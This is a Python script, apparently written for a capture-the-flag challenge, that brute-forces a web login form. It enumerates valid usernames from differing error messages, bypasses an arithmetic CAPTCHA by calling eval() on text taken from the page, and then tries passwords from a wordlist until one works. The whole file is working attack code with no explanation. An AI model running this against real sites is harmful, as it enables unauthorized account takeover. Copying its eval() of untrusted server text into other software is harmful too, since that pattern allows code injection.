import requests
from termcolor import colored
import time
import argparse
import os

parser = argparse.ArgumentParser(description='Bruteforce a login form.')
parser.add_argument('-u', '--url', help='Enter the login URL', required=True)
args = parser.parse_args()

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': args.url
}

# File paths
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"

# Check if username and password files exist
if not os.path.exists(usernames_file) or not os.path.exists(passwords_file):
    print(colored("[ERROR] Username or password file is missing!", "red"))
    exit()

def usernames_enumeration():
    with open(usernames_file, "r") as file:
        for username in file:
            username = username.strip("\n")
            data = {
                'username': username,
                'password': 'password'  # Dummy password for enumeration
            }
            response = requests.post(args.url, headers=headers, data=data)
            captcha_signature = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            
            # CAPTCHA handling
            if captcha_signature in response.text:
                captcha_answer = solve_captcha(response.text, captcha_signature)
                data['captcha'] = captcha_answer
            
            send_answer = requests.post(args.url, headers=headers, data=data)
            if "does not exist" in send_answer.text:
                print(colored(f"[-] Testing username: {username}", "red"))
            else:
                print(colored(f"[+] Valid username found: {username}", "green"))
                time.sleep(1)
                return username
    return None

def brute_force_password(username):
    with open(passwords_file, "r") as file:
        for password in file:
            password = password.strip("\n")
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(args.url, headers=headers, data=data)
            captcha_signature = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            
            # CAPTCHA handling
            if captcha_signature in response.text:
                captcha_answer = solve_captcha(response.text, captcha_signature)
                data['captcha'] = captcha_answer
            
            send_answer = requests.post(args.url, headers=headers, data=data)
            if "Invalid password" in send_answer.text:
                print(colored(f"[-] Testing password {password} for username: {username}", "red"))
            else:
                print(colored(f"[+] Valid password for username {username}: {password}", "green"))
                print("Use these credentials to login and retrieve the flag!")
                break

def solve_captcha(content, captcha_signature):
    """Solve arithmetic-based CAPTCHA."""
    try:
        start = content.find(captcha_signature) + len(captcha_signature)
        end = content.find('=', start)
        captcha = content[start:end].strip()
        captcha_answer = f'{captcha} = {eval(captcha)}'
        return captcha_answer.split()[-1]
    except Exception as e:
        print(colored(f"[ERROR] Failed to solve CAPTCHA: {e}", "red"))
        return None

# Start the bruteforce process
try:
    url = args.url
    print(colored(f"[INFO] Processing: {url}", "blue"))
    
    username = usernames_enumeration()
    if username:
        brute_force_password(username)
    else:
        print(colored("[ERROR] No valid username found.", "red"))

except requests.exceptions.RequestException as e:
    print(colored(f"[ERROR] HTTP request failed: {e}", "red"))
except Exception as e:
    print(colored(f"[ERROR] An unexpected error occurred: {e}", "red"))

                                                                                 